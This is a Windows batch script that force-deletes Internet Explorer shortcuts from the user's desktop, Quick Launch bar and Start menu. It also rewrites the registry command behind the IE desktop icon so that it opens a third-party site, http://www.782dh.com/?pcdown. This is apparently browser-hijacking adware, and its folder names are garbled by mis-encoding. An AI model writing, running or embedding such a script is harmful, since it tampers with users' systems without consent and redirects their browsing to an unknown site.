del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk" /f/q/a
del "%userprofile%\����\IEXPLORE.lnk" /f/q/a
del "%userprofile%\����\IEXPLOREr.lnk" /f/q/a


del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.url" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk" /f/q/a

del   "%userprofile%\����ʼ���˵�\Internet Explorer.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\Internet Explorer.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\Internet Explorer.url" /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\Internet Explorer.lnk" /f/q/a





@reg del "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v  
@reg add "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v "" /d "%ProgramFiles%\Internet Explorer\iexplore.exe http://www.782dh.com/?pcdown" /f




del "%userprofile%\����\*Internet*.lnk" /f/q/a



del "%userprofile%\����\Internet Exp*.lnk" /f/q/a
del "%userprofile%\����\Internet Explorer.lnk" /f/q/a
del "%userprofile%\����\Internet Exp1orer.lnk" /f/q/a
del "%userprofile%\����\Internet Explorer.lnk"  /f/q/a
 
del "%userprofile%\����ʼ���˵�\����\Internet*.lnk"  /f/q/a

del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\Internet *.url"  /f/q/a
del "C:\Documents and Settings\All Users\����\Internet *.url" /f/q/a


